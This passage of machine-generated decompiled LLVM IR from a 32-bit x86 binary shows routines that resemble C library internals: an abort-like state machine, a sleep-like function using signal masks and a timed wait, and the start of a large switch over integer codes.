dec_label_pc_804c358:                             ; preds = %dec_label_pc_804c34a.dec_label_pc_804c34a_crit_edge, %dec_label_pc_804c34a.lr.ph
  %v0_804c358 = load i32, i32* @ebx, align 4
  %v2_804c35c = ptrtoint i32* %stack_var_-132 to i32
  store i32 %v2_804c35c, i32* @ebx, align 4
  %v4_804c364 = call i32 @function_804b682(i32 %v2_804c35c, i32 6, i32 %v0_804c358, i32 %v0_804c358)
  store i32 %v4_804c364, i32* %eax.global-to-local, align 4
  %v1_804c36c = icmp eq i32 %v4_804c364, 0
  %v1_804c36e = icmp eq i1 %v1_804c36c, false
  br i1 %v1_804c36e, label %dec_label_pc_804c37e, label %dec_label_pc_804c370

dec_label_pc_804c370:                             ; preds = %dec_label_pc_804c358
  %v3_804c376 = bitcast i32* %stack_var_-132 to %_TYPEDEF_sigset_t*
  %v4_804c376 = call i32 @function_804cf32(i32 1, %_TYPEDEF_sigset_t* %v3_804c376, i32 0)
  store i32 %v4_804c376, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804c37e

dec_label_pc_804c37e:                             ; preds = %dec_label_pc_804c358, %dec_label_pc_804c370
  %v2_804c3b623 = phi i32 [ %v4_804c364, %dec_label_pc_804c358 ], [ %v4_804c376, %dec_label_pc_804c370 ]
  %v0_804c37e = load i8, i8* @global_var_804f6b4.100, align 4
  %v1_804c37e = icmp eq i8 %v0_804c37e, 0
  %v1_804c385 = icmp eq i1 %v1_804c37e, false
  br i1 %v1_804c385, label %dec_label_pc_804c3b6, label %dec_label_pc_804c387

dec_label_pc_804c387:                             ; preds = %dec_label_pc_804c37e
  store i8 1, i8* @global_var_804f6b4.100, align 4
  br label %dec_label_pc_804c38e

dec_label_pc_804c38e:                             ; preds = %dec_label_pc_804c3f5, %dec_label_pc_804c387
  %v1_804c396 = call i32 @function_804c7b4(i32 ptrtoint (i32* @global_var_804f620.99 to i32))
  store i32 %v1_804c396, i32* %eax.global-to-local, align 4
  %v1_804c3a2 = call i32 @function_804d059(i32 6)
  store i32 %v1_804c3a2, i32* %eax.global-to-local, align 4
  %v1_804c3ae = call i32 @function_804c7b4(i32 ptrtoint (i32* @global_var_804f620.99 to i32))
  store i32 %v1_804c3ae, i32* %eax.global-to-local, align 4
  %v0_804c3b6.pre = load i8, i8* @global_var_804f6b4.100, align 4
  br label %dec_label_pc_804c3b6

dec_label_pc_804c3b6:                             ; preds = %dec_label_pc_804c37e, %dec_label_pc_804c38e
  %v2_804c3b6 = phi i32 [ %v2_804c3b623, %dec_label_pc_804c37e ], [ %v1_804c3ae, %dec_label_pc_804c38e ]
  %v0_804c3b6 = phi i8 [ %v0_804c37e, %dec_label_pc_804c37e ], [ %v0_804c3b6.pre, %dec_label_pc_804c38e ]
  %v1_804c3b6 = zext i8 %v0_804c3b6 to i32
  %v3_804c3b6 = and i32 %v2_804c3b6, -256
  %v4_804c3b6 = or i32 %v1_804c3b6, %v3_804c3b6
  store i32 %v4_804c3b6, i32* %eax.global-to-local, align 4
  %v10_804c3bb = icmp eq i8 %v0_804c3b6, 1
  %v1_804c3bd = icmp eq i1 %v10_804c3bb, false
  br i1 %v1_804c3bd, label %dec_label_pc_804c417, label %dec_label_pc_804c3ea.lr.ph

dec_label_pc_804c3ea.lr.ph:                       ; preds = %dec_label_pc_804c3b6
  %v2_804c3c7 = ptrtoint i32* %stack_var_-272 to i32
  store i32 %v2_804c3c7, i32* %eax.global-to-local, align 4
  store i8 2, i8* @global_var_804f6b4.100, align 4
  %v3_804c3d3 = bitcast i32* %stack_var_-272 to i8*
  %v4_804c3d3 = call i32 @function_804b381(i8* %v3_804c3d3, i32 0, i32 140)
  store i32 0, i32* %stack_var_-272, align 4
  store i32 31, i32* %eax.global-to-local, align 4
  %v4_804c3ea40 = add i32 %v12_804c345, 140
  %v5_804c3ea41 = inttoptr i32 %v4_804c3ea40 to i32*
  store i32 -1, i32* %v5_804c3ea41, align 4
  %v0_804c3f242 = load i32, i32* %eax.global-to-local, align 4
  %v1_804c3f243 = add i32 %v0_804c3f242, -1
  %v9_804c3f244 = icmp slt i32 %v1_804c3f243, 0
  store i32 %v1_804c3f243, i32* %eax.global-to-local, align 4
  %v1_804c3f345 = icmp eq i1 %v9_804c3f244, false
  br i1 %v1_804c3f345, label %dec_label_pc_804c3ea.dec_label_pc_804c3ea_crit_edge, label %dec_label_pc_804c3f5

dec_label_pc_804c3ea.dec_label_pc_804c3ea_crit_edge: ; preds = %dec_label_pc_804c3ea.lr.ph, %dec_label_pc_804c3ea.dec_label_pc_804c3ea_crit_edge
  %v1_804c3f246 = phi i32 [ %v1_804c3f2, %dec_label_pc_804c3ea.dec_label_pc_804c3ea_crit_edge ], [ %v1_804c3f243, %dec_label_pc_804c3ea.lr.ph ]
  %v0_804c3ea.pre = load i32, i32* @esp, align 4
  %v2_804c3ea = mul i32 %v1_804c3f246, 4
  %v3_804c3ea = add i32 %v0_804c3ea.pre, 16
  %v4_804c3ea = add i32 %v3_804c3ea, %v2_804c3ea
  %v5_804c3ea = inttoptr i32 %v4_804c3ea to i32*
  store i32 -1, i32* %v5_804c3ea, align 4
  %v0_804c3f2 = load i32, i32* %eax.global-to-local, align 4
  %v1_804c3f2 = add i32 %v0_804c3f2, -1
  %v9_804c3f2 = icmp slt i32 %v1_804c3f2, 0
  store i32 %v1_804c3f2, i32* %eax.global-to-local, align 4
  %v1_804c3f3 = icmp eq i1 %v9_804c3f2, false
  br i1 %v1_804c3f3, label %dec_label_pc_804c3ea.dec_label_pc_804c3ea_crit_edge, label %dec_label_pc_804c3f5

dec_label_pc_804c3f5:                             ; preds = %dec_label_pc_804c3ea.dec_label_pc_804c3ea_crit_edge, %dec_label_pc_804c3ea.lr.ph
  store i32 %v2_804c3c7, i32* %eax.global-to-local, align 4
  %v4_804c40a = call i32 @function_804c9f7(i32 6, i32* nonnull %stack_var_-272, i32 0)
  store i32 %v4_804c40a, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804c38e

dec_label_pc_804c417:                             ; preds = %dec_label_pc_804c3b6
  %v10_804c417 = icmp eq i8 %v0_804c3b6, 2
  %v1_804c419 = icmp eq i1 %v10_804c417, false
  br i1 %v1_804c419, label %dec_label_pc_804c423, label %dec_label_pc_804c423.thread

dec_label_pc_804c423.thread:                      ; preds = %dec_label_pc_804c417
  store i8 3, i8* @global_var_804f6b4.100, align 4
  br label %dec_label_pc_804c42c

dec_label_pc_804c423:                             ; preds = %dec_label_pc_804c417
  %v9_804c423 = icmp eq i8 %v0_804c3b6, 3
  %v1_804c42a = icmp eq i1 %v9_804c423, false
  br i1 %v1_804c42a, label %dec_label_pc_804c43d, label %dec_label_pc_804c42c

dec_label_pc_804c42c:                             ; preds = %dec_label_pc_804c423.thread, %dec_label_pc_804c423
  store i8 4, i8* @global_var_804f6b4.100, align 4
  %v1_804c438 = call i32 @function_804cb5c(i32 127)
  unreachable

dec_label_pc_804c43d:                             ; preds = %dec_label_pc_804c423, %dec_label_pc_804c43d
  br label %dec_label_pc_804c43d

; uselistorder directives
  uselistorder i32 %v1_804c3f2, { 2, 1, 0 }
  uselistorder i32 %v1_804c355, { 2, 1, 0 }
  uselistorder i32* %stack_var_-272, { 0, 2, 1, 3 }
  uselistorder i32* %eax.global-to-local, { 6, 7, 9, 8, 0, 1, 2, 10, 11, 12, 13, 14, 15, 16, 18, 17, 5, 3, 4 }
  uselistorder i8 4, { 2, 1, 0 }
  uselistorder i8 3, { 0, 10, 4, 2, 5, 3, 1, 6, 7, 8, 9 }
  uselistorder i8 2, { 6, 17, 14, 0, 1, 2, 3, 4, 15, 16, 5, 13, 10, 8, 9, 7, 11, 12 }
  uselistorder i8* @global_var_804f6b4.100, { 5, 4, 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_804c43d, { 1, 0 }
  uselistorder label %dec_label_pc_804c42c, { 1, 0 }
  uselistorder label %dec_label_pc_804c3ea.dec_label_pc_804c3ea_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_804c3b6, { 1, 0 }
  uselistorder label %dec_label_pc_804c37e, { 1, 0 }
  uselistorder label %dec_label_pc_804c34a.dec_label_pc_804c34a_crit_edge, { 1, 0 }
}

define i32 @function_804c440(i32 %arg1) local_unnamed_addr {
dec_label_pc_804c440:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* @esi, align 4
  %v2_804c453 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_804c453, i32* @ebx, align 4
  %v2_804c458 = call i32 @function_804c7b7(i32 %v2_804c453, i32 134530996)
  %v1_804c464 = call i32 @function_804c7b4(i32 ptrtoint (i32* @global_var_804f638.101 to i32))
  %v0_804c469 = load i32, i32* @global_var_804f6b8.102, align 8
  store i32 %v0_804c469, i32* @eax, align 4
  %v1_804c471 = icmp eq i32 %v0_804c469, 0
  br i1 %v1_804c471, label %dec_label_pc_804c47e, label %dec_label_pc_804c475

dec_label_pc_804c475:                             ; preds = %dec_label_pc_804c440
  %v0_804c478 = load i32, i32* @esi, align 4
  %v1_804c479 = call i32 @unknown_0(i32 %v0_804c478)
  store i32 %v1_804c479, i32* @eax, align 4
  br label %dec_label_pc_804c47e

dec_label_pc_804c47e:                             ; preds = %dec_label_pc_804c440, %dec_label_pc_804c475
  %v2_804c483 = call i32 @function_804c7b7(i32 %v2_804c453, i32 1)
  %v0_804c488 = call i32 @function_804c775()
  %v0_804c4a1 = load i32, i32* @esi, align 4
  %v1_804c4a2 = call i32 @function_804cb5c(i32 %v0_804c4a1)
  unreachable

; uselistorder directives
  uselistorder i32 (i32)* @function_804cb5c, { 1, 0 }
  uselistorder i32 (i32)* @function_804c7b4, { 3, 2, 1, 0, 7, 9, 4, 6, 5, 8 }
  uselistorder i32 (i32, i32)* @function_804c7b7, { 1, 0, 7, 6, 11, 10, 5, 2, 4, 3, 9, 8 }
  uselistorder label %dec_label_pc_804c47e, { 1, 0 }
}

define i32 @function_804c4a7(i32 %arg1) local_unnamed_addr {
dec_label_pc_804c4a7:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-420 = alloca i32, align 4
  %stack_var_-280 = alloca i32, align 4
  %stack_var_-460 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-444 = alloca i32, align 4
  %v0_804c4a7 = load i32, i32* @ebp, align 4
  store i32 32, i32* %eax.global-to-local, align 4
  %v0_804c4ad = load i32, i32* @edi, align 4
  %v0_804c4ae = load i32, i32* @esi, align 4
  %v0_804c4af = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* %edx.global-to-local, align 4
  %v1_804c4bd = icmp eq i32 %arg1, 0
  %v1_804c4bf = icmp eq i1 %v1_804c4bd, false
  br i1 %v1_804c4bf, label %dec_label_pc_804c4c6.lr.ph, label %dec_label_pc_804c61e

dec_label_pc_804c4c6.lr.ph:                       ; preds = %dec_label_pc_804c4a7
  %v15_804c4b0 = ptrtoint i32* %stack_var_-444 to i32
  store i32 31, i32* %eax.global-to-local, align 4
  %v4_804c4c656 = add i32 %v15_804c4b0, 416
  %v5_804c4c657 = inttoptr i32 %v4_804c4c656 to i32*
  store i32 0, i32* %v5_804c4c657, align 4
  %v0_804c4d158 = load i32, i32* %eax.global-to-local, align 4
  %v1_804c4d159 = add i32 %v0_804c4d158, -1
  %v9_804c4d160 = icmp slt i32 %v1_804c4d159, 0
  store i32 %v1_804c4d159, i32* %eax.global-to-local, align 4
  %v1_804c4d261 = icmp eq i1 %v9_804c4d160, false
  br i1 %v1_804c4d261, label %dec_label_pc_804c4c6.dec_label_pc_804c4c6_crit_edge, label %dec_label_pc_804c4d4

dec_label_pc_804c4c6.dec_label_pc_804c4c6_crit_edge: ; preds = %dec_label_pc_804c4c6.lr.ph, %dec_label_pc_804c4c6.dec_label_pc_804c4c6_crit_edge
  %v1_804c4d162 = phi i32 [ %v1_804c4d1, %dec_label_pc_804c4c6.dec_label_pc_804c4c6_crit_edge ], [ %v1_804c4d159, %dec_label_pc_804c4c6.lr.ph ]
  %v0_804c4c6.pre = load i32, i32* @esp, align 4
  %v2_804c4c6 = mul i32 %v1_804c4d162, 4
  %v3_804c4c6 = add i32 %v0_804c4c6.pre, 292
  %v4_804c4c6 = add i32 %v3_804c4c6, %v2_804c4c6
  %v5_804c4c6 = inttoptr i32 %v4_804c4c6 to i32*
  store i32 0, i32* %v5_804c4c6, align 4
  %v0_804c4d1 = load i32, i32* %eax.global-to-local, align 4
  %v1_804c4d1 = add i32 %v0_804c4d1, -1
  %v9_804c4d1 = icmp slt i32 %v1_804c4d1, 0
  store i32 %v1_804c4d1, i32* %eax.global-to-local, align 4
  %v1_804c4d2 = icmp eq i1 %v9_804c4d1, false
  br i1 %v1_804c4d2, label %dec_label_pc_804c4c6.dec_label_pc_804c4c6_crit_edge, label %dec_label_pc_804c4d4

dec_label_pc_804c4d4:                             ; preds = %dec_label_pc_804c4c6.dec_label_pc_804c4c6_crit_edge, %dec_label_pc_804c4c6.lr.ph
  %v1_804c4d1.lcssa = phi i32 [ %v1_804c4d159, %dec_label_pc_804c4c6.lr.ph ], [ %v1_804c4d1, %dec_label_pc_804c4c6.dec_label_pc_804c4c6_crit_edge ]
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_804c4ea = ptrtoint i32* %stack_var_-152 to i32
  store i32 %v2_804c4ea, i32* @ebx, align 4
  store i32 %v2_804c4ea, i32* %stack_var_-460, align 4
  %v4_804c4f2 = call i32 @function_804b682(i32 %v2_804c4ea, i32 17, i32 %v1_804c4d1.lcssa, i32 %v1_804c4d1.lcssa)
  store i32 %v4_804c4f2, i32* %eax.global-to-local, align 4
  %v2_804c4fa = icmp slt i32 %v4_804c4f2, 0
  br i1 %v2_804c4fa, label %dec_label_pc_804c622, label %dec_label_pc_804c502

dec_label_pc_804c502:                             ; preds = %dec_label_pc_804c4d4
  %v2_804c503 = ptrtoint i32* %stack_var_-280 to i32
  store i32 %v2_804c503, i32* @esi, align 4
  store i32 0, i32* %stack_var_-460, align 4
  %v3_804c50e = bitcast i32* %stack_var_-152 to %_TYPEDEF_sigset_t*
  %v4_804c50e = call i32 @function_804cf32(i32 0, %_TYPEDEF_sigset_t* %v3_804c50e, i32 %v2_804c503)
  store i32 %v4_804c50e, i32* %eax.global-to-local, align 4
  %v1_804c516 = icmp eq i32 %v4_804c50e, 0
  %v1_804c518 = icmp eq i1 %v1_804c516, false
  br i1 %v1_804c518, label %dec_label_pc_804c622, label %dec_label_pc_804c51e

dec_label_pc_804c51e:                             ; preds = %dec_label_pc_804c502
  store i32 %v2_804c503, i32* %stack_var_-460, align 4
  %v4_804c523 = call i32 @function_804b65e(i32 %v2_804c503, i32 17, i32 %v4_804c50e, i32 %v4_804c50e)
  store i32 %v4_804c523, i32* %eax.global-to-local, align 4
  store i32 32, i32* %edx.global-to-local, align 4
  %v1_804c530 = icmp eq i32 %v4_804c523, 0
  br i1 %v1_804c530, label %dec_label_pc_804c539.lr.ph, label %dec_label_pc_804c5ec

dec_label_pc_804c539.lr.ph:                       ; preds = %dec_label_pc_804c51e
  store i32 31, i32* %edx.global-to-local, align 4
  store i32 0, i32* %v5_804c4c657, align 4
  %v0_804c54450 = load i32, i32* %edx.global-to-local, align 4
  %v1_804c54451 = add i32 %v0_804c54450, -1
  %v9_804c54452 = icmp slt i32 %v1_804c54451, 0
  store i32 %v1_804c54451, i32* %edx.global-to-local, align 4
  %v1_804c54553 = icmp eq i1 %v9_804c54452, false
  br i1 %v1_804c54553, label %dec_label_pc_804c539.dec_label_pc_804c539_crit_edge, label %dec_label_pc_804c547

dec_label_pc_804c539.dec_label_pc_804c539_crit_edge: ; preds = %dec_label_pc_804c539.lr.ph, %dec_label_pc_804c539.dec_label_pc_804c539_crit_edge
  %v1_804c54454 = phi i32 [ %v1_804c544, %dec_label_pc_804c539.dec_label_pc_804c539_crit_edge ], [ %v1_804c54451, %dec_label_pc_804c539.lr.ph ]
  %v0_804c539.pre = load i32, i32* @esp, align 4
  %v2_804c539 = mul i32 %v1_804c54454, 4
  %v3_804c539 = add i32 %v0_804c539.pre, 292
  %v4_804c539 = add i32 %v3_804c539, %v2_804c539
  %v5_804c539 = inttoptr i32 %v4_804c539 to i32*
  store i32 0, i32* %v5_804c539, align 4
  %v0_804c544 = load i32, i32* %edx.global-to-local, align 4
  %v1_804c544 = add i32 %v0_804c544, -1
  %v9_804c544 = icmp slt i32 %v1_804c544, 0
  store i32 %v1_804c544, i32* %edx.global-to-local, align 4
  %v1_804c545 = icmp eq i1 %v9_804c544, false
  br i1 %v1_804c545, label %dec_label_pc_804c539.dec_label_pc_804c539_crit_edge, label %dec_label_pc_804c547

dec_label_pc_804c547:                             ; preds = %dec_label_pc_804c539.dec_label_pc_804c539_crit_edge, %dec_label_pc_804c539.lr.ph
  store i32 %v2_804c4ea, i32* %eax.global-to-local, align 4
  store i32 %v2_804c4ea, i32* %stack_var_-460, align 4
  %v4_804c553 = call i32 @function_804b682(i32 %v2_804c4ea, i32 17, i32 0, i32 0)
  store i32 %v4_804c553, i32* %eax.global-to-local, align 4
  %v2_804c55b = icmp slt i32 %v4_804c553, 0
  br i1 %v2_804c55b, label %dec_label_pc_804c622, label %dec_label_pc_804c563

dec_label_pc_804c563:                             ; preds = %dec_label_pc_804c547
  %v2_804c564 = ptrtoint i32* %stack_var_-420 to i32
  store i32 %v2_804c564, i32* %eax.global-to-local, align 4
  store i32 17, i32* %stack_var_-460, align 4
  %v4_804c56d = call i32 @function_804c9f7(i32 17, i32* null, i32 %v2_804c564)
  store i32 %v4_804c56d, i32* %eax.global-to-local, align 4
  %v2_804c575 = icmp slt i32 %v4_804c56d, 0
  %v1_804c577 = icmp eq i1 %v2_804c575, false
  br i1 %v1_804c577, label %dec_label_pc_804c5a1, label %dec_label_pc_804c579

dec_label_pc_804c579:                             ; preds = %dec_label_pc_804c563
  %v0_804c579 = load i32, i32* %stack_var_-460, align 4
  %v1_804c579 = call i32 @function_804b330(i32 %v0_804c579)
  store i32 %v1_804c579, i32* %eax.global-to-local, align 4
  %v1_804c57e = inttoptr i32 %v1_804c579 to i32*
  %v2_804c57e = load i32, i32* %v1_804c57e, align 4
  store i32 %v2_804c57e, i32* @esi, align 4
  store i32 %v1_804c579, i32* @ebx, align 4
  store i32 %v2_804c503, i32* %eax.global-to-local, align 4
  store i32 2, i32* %stack_var_-460, align 4
  %v3_804c58f = bitcast i32* %stack_var_-280 to %_TYPEDEF_sigset_t*
  %v4_804c58f = call i32 @function_804cf32(i32 2, %_TYPEDEF_sigset_t* %v3_804c58f, i32 0)
  store i32 -1, i32* %eax.global-to-local, align 4
  %v0_804c59a = load i32, i32* @esi, align 4
  %v1_804c59a = load i32, i32* @ebx, align 4
  %v2_804c59a = inttoptr i32 %v1_804c59a to i32*
  store i32 %v0_804c59a, i32* %v2_804c59a, align 4
  %v0_804c62f.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804c625

dec_label_pc_804c5a1:                             ; preds = %dec_label_pc_804c563
  %v3_804c5a1 = load i32, i32* %stack_var_-420, align 4
  %v12_804c5a1 = icmp eq i32 %v3_804c5a1, 1
  %v2_804c5ad = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_804c5ad, i32* @ebx, align 4
  %v1_804c5b4 = icmp eq i1 %v12_804c5a1, false
  br i1 %v1_804c5b4, label %dec_label_pc_804c5db, label %dec_label_pc_804c5b6

dec_label_pc_804c5b6:                             ; preds = %dec_label_pc_804c5a1
  %v0_804c5b6 = load i32, i32* @edi, align 4
  store i32 %v2_804c5ad, i32* %stack_var_-460, align 4
  %v4_804c5ba = bitcast i32* %stack_var_-24 to %timespec*
  %v5_804c5ba = call i32 @function_804ceb2(%timespec* %v4_804c5ba, i32 %v2_804c5ad, i32 %v0_804c5b6, i32 %v0_804c5b6)
  store i32 %v5_804c5ba, i32* %eax.global-to-local, align 4
  store i32 %v5_804c5ba, i32* @edi, align 4
  %v1_804c5c1 = call i32 @function_804b330(i32 %v2_804c5ad)
  store i32 %v1_804c5c1, i32* %eax.global-to-local, align 4
  %v1_804c5c9 = inttoptr i32 %v1_804c5c1 to i32*
  %v2_804c5c9 = load i32, i32* %v1_804c5c9, align 4
  store i32 %v2_804c5c9, i32* @esi, align 4
  store i32 %v1_804c5c1, i32* @ebx, align 4
  store i32 2, i32* %stack_var_-460, align 4
  %v3_804c5d2 = bitcast i32* %stack_var_-280 to %_TYPEDEF_sigset_t*
  %v4_804c5d2 = call i32 @function_804cf32(i32 2, %_TYPEDEF_sigset_t* %v3_804c5d2, i32 0)
  store i32 %v4_804c5d2, i32* %eax.global-to-local, align 4
  %v0_804c5d7 = load i32, i32* @esi, align 4
  %v1_804c5d7 = load i32, i32* @ebx, align 4
  %v2_804c5d7 = inttoptr i32 %v1_804c5d7 to i32*
  store i32 %v0_804c5d7, i32* %v2_804c5d7, align 4
  %v0_804c601.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_804c5fe

dec_label_pc_804c5db:                             ; preds = %dec_label_pc_804c5a1
  store i32 2, i32* %stack_var_-460, align 4
  %v3_804c5e1 = bitcast i32* %stack_var_-280 to %_TYPEDEF_sigset_t*
  %v4_804c5e1 = call i32 @function_804cf32(i32 2, %_TYPEDEF_sigset_t* %v3_804c5e1, i32 0)
  store i32 %v4_804c5e1, i32* %eax.global-to-local, align 4
  store i32 2, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804c5f7

dec_label_pc_804c5ec:                             ; preds = %dec_label_pc_804c51e
  %v2_804c5ee = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_804c5ee, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804c5f7

dec_label_pc_804c5f7:                             ; preds = %dec_label_pc_804c5db, %dec_label_pc_804c5ec
  %storemerge3.pre-phi = phi i32 [ %v2_804c5ad, %dec_label_pc_804c5db ], [ %v2_804c5ee, %dec_label_pc_804c5ec ]
  %v3_804c5f7 = phi i32 [ %v2_804c503, %dec_label_pc_804c5db ], [ %v4_804c523, %dec_label_pc_804c5ec ]
  %v2_804c5f7 = phi i32 [ 0, %dec_label_pc_804c5db ], [ %v4_804c523, %dec_label_pc_804c5ec ]
  store i32 %storemerge3.pre-phi, i32* %stack_var_-460, align 4
  %v4_804c5f7 = bitcast i32* %stack_var_-24 to %timespec*
  %v5_804c5f7 = call i32 @function_804ceb2(%timespec* %v4_804c5f7, i32 %storemerge3.pre-phi, i32 %v2_804c5f7, i32 %v3_804c5f7)
  store i32 %v5_804c5f7, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804c5fe

dec_label_pc_804c5fe:                             ; preds = %dec_label_pc_804c5b6, %dec_label_pc_804c5f7
  %v0_804c601 = phi i32 [ %v0_804c601.pre, %dec_label_pc_804c5b6 ], [ %v5_804c5f7, %dec_label_pc_804c5f7 ]
  %v1_804c601 = icmp eq i32 %v0_804c601, 0
  br i1 %v1_804c601, label %dec_label_pc_804c61e, label %dec_label_pc_804c605

dec_label_pc_804c605:                             ; preds = %dec_label_pc_804c5fe
  %v4_804c615 = load i32, i32* %stack_var_-24, align 4
  store i32 %v4_804c615, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804c625

dec_label_pc_804c61e:                             ; preds = %dec_label_pc_804c4a7, %dec_label_pc_804c5fe
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804c625

dec_label_pc_804c622:                             ; preds = %dec_label_pc_804c547, %dec_label_pc_804c502, %dec_label_pc_804c4d4
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804c625

dec_label_pc_804c625:                             ; preds = %dec_label_pc_804c579, %dec_label_pc_804c61e, %dec_label_pc_804c605, %dec_label_pc_804c622
  %v0_804c62f = phi i32 [ %v0_804c62f.pre, %dec_label_pc_804c579 ], [ 0, %dec_label_pc_804c61e ], [ %v4_804c615, %dec_label_pc_804c605 ], [ -1, %dec_label_pc_804c622 ]
  store i32 %v0_804c4af, i32* @ebx, align 4
  store i32 %v0_804c4ae, i32* @esi, align 4
  store i32 %v0_804c4ad, i32* @edi, align 4
  store i32 %v0_804c4a7, i32* @ebp, align 4
  ret i32 %v0_804c62f

; uselistorder directives
  uselistorder i32 %storemerge3.pre-phi, { 1, 0 }
  uselistorder i32 %v1_804c5c1, { 1, 0, 2 }
  uselistorder i32 %v2_804c5ad, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v1_804c544, { 2, 1, 0 }
  uselistorder i32 %v4_804c523, { 1, 0, 2, 3 }
  uselistorder i32 %v2_804c503, { 0, 2, 4, 3, 1, 5 }
  uselistorder i32 %v2_804c4ea, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32 %v1_804c4d1, { 0, 3, 2, 1 }
  uselistorder i32* %stack_var_-460, { 0, 2, 3, 4, 5, 1, 6, 7, 8, 9, 10 }
  uselistorder i32* %stack_var_-24, { 2, 0, 4, 1, 5, 3 }
  uselistorder i32* %edx.global-to-local, { 7, 4, 3, 2, 0, 1, 5, 6 }
  uselistorder i32* %eax.global-to-local, { 20, 21, 22, 23, 24, 25, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 18, 17, 0, 1, 2, 19 }
  uselistorder i32 (%timespec*, i32, i32, i32)* @function_804ceb2, { 1, 0 }
  uselistorder i32 (i32, i32*, i32)* @function_804c9f7, { 1, 2, 0 }
  uselistorder i32 (i32, %_TYPEDEF_sigset_t*, i32)* @function_804cf32, { 4, 0, 1, 2, 3 }
  uselistorder i32 (i32, i32, i32, i32)* @function_804b682, { 2, 1, 0, 3 }
  uselistorder i32 %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804c625, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_804c61e, { 1, 0 }
  uselistorder label %dec_label_pc_804c5fe, { 1, 0 }
  uselistorder label %dec_label_pc_804c5f7, { 1, 0 }
  uselistorder label %dec_label_pc_804c539.dec_label_pc_804c539_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_804c4c6.dec_label_pc_804c4c6_crit_edge, { 1, 0 }
}

define i32 @function_804c630(i32 %arg1) local_unnamed_addr {
dec_label_pc_804c630:
  switch i32 %arg1, label %dec_label_pc_804c64f [
    i32 0, label %dec_label_pc_804c65f
    i32 1, label %dec_label_pc_804c744
    i32 2, label %dec_label_pc_804c669
    i32 3, label %dec_label_pc_804c673
    i32 4, label %dec_label_pc_804c67d
    i32 5, label %dec_label_pc_804c713
    i32 6, label %dec_label_pc_804c685
    i32 7, label %dec_label_pc_804c645
    i32 8, label %dec_label_pc_804c645
    i32 9, label %dec_label_pc_804c645
    i32 10, label %dec_label_pc_804c645
    i32 11, label %dec_label_pc_804c645
    i32 12, label %dec_label_pc_804c645
    i32 13, label %dec_label_pc_804c645
    i32 14, label %dec_label_pc_804c645
    i32 15, label %dec_label_pc_804c645
    i32 16, label %dec_label_pc_804c645
    i32 17, label %dec_label_pc_804c645
    i32 18, label %dec_label_pc_804c645
    i32 19, label %dec_label_pc_804c645
    i32 20, label %dec_label_pc_804c645
    i32 21, label %dec_label_pc_804c645
    i32 22, label %dec_label_pc_804c645
    i32 23, label %dec_label_pc_804c744
    i32 24, label %dec_label_pc_804c744
    i32 25, label %dec_label_pc_804c750
    i32 26, label %dec_label_pc_804c721
    i32 27, label %dec_label_pc_804c744
    i32 28, label %dec_label_pc_804c697
    i32 29, label %dec_label_pc_804c71a
    i32 30, label %dec_label_pc_804c68f
    i32 31, label %dec_label_pc_804c72f
    i32 32, label %dec_label_pc_804c744
    i32 33, label %dec_label_pc_804c744
    i32 34, label %dec_label_pc_804c744
    i32 35, label %dec_label_pc_804c728
    i32 36, label %dec_label_pc_804c757
    i32 37, label %dec_label_pc_804c75e
    i32 38, label %dec_label_pc_804c757
    i32 39, label %dec_label_pc_804c6a1
    i32 40, label %dec_label_pc_804c765
    i32 41, label %dec_label_pc_804c744
    i32 42, label %dec_label_pc_804c72f
    i32 43, label %dec_label_pc_804c75e
    i32 44, label %dec_label_pc_804c76c
    i32 45, label %dec_label_pc_804c75e
    i32 46, label %dec_label_pc_804c71a
    i32 47, label %dec_label_pc_804c71a
    i32 48, label %dec_label_pc_804c71a
    i32 49, label %dec_label_pc_804c744
    i32 50, label %dec_label_pc_804c744
    i32 51, label %dec_label_pc_804c71a
    i32 52, label %dec_label_pc_804c71a
    i32 53, label %dec_label_pc_804c744
    i32 54, label %dec_label_pc_804c744
    i32 55, label %dec_label_pc_804c744
    i32 56, label %dec_label_pc_804c744
    i32 57, label %dec_label_pc_804c744
    i32 58, label %dec_label_pc_804c744
    i32 59, label %dec_label_pc_804c744
    i32 60, label %dec_label_pc_804c744
    i32 61, label %dec_label_pc_804c744
    i32 62, label %dec_label_pc_804c744
    i32 63, label %dec_label_pc_804c744
    i32 64, label %dec_label_pc_804c744
    i32 65, label %dec_label_pc_804c744
    i32 66, label %dec_label_pc_804c744
    i32 67, label %dec_label_pc_804c645
    i32 68, label %dec_label_pc_804c645
    i32 69, label %dec_label_pc_804c728
    i32 70, label %dec_label_pc_804c728
    i32 71, label %dec_label_pc_804c728
    i32 72, label %dec_label_pc_804c72f
    i32 73, label %dec_label_pc_804c736
    i32 74, label %dec_label_pc_804c73d
    i32 75, label %dec_label_pc_804c6ab
    i32 76, label %dec_label_pc_804c73d
    i32 77, label %dec_label_pc_804c645
    i32 78, label %dec_label_pc_804c645
    i32 79, label %dec_label_pc_804c645
    i32 80, label %dec_label_pc_804c645
    i32 81, label %dec_label_pc_804c645
    i32 82, label %dec_label_pc_804c645
    i32 83, label %dec_label_pc_804c645
    i32 84, label %dec_label_pc_804c645
    i32 85, label %dec_label_pc_804c744
